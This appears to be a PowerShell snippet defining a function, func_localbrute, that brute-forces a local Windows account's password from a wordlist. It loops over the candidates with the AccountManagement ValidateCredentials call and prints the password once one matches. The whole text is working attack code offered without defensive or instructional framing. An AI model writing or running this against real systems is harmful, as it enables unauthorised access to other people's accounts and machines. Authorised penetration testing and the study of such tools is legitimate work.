Function func_localbrute {
  param($u,$dic)
  Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
  $t = [DirectoryServices.AccountManagement.ContextType]::Machine
  $a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)
  foreach($p in gc $dic) {
    if ($a.ValidateCredentials($u,$p)) {
      Write-Host "Password for $u account found: $p"
      break
    }
  }
}
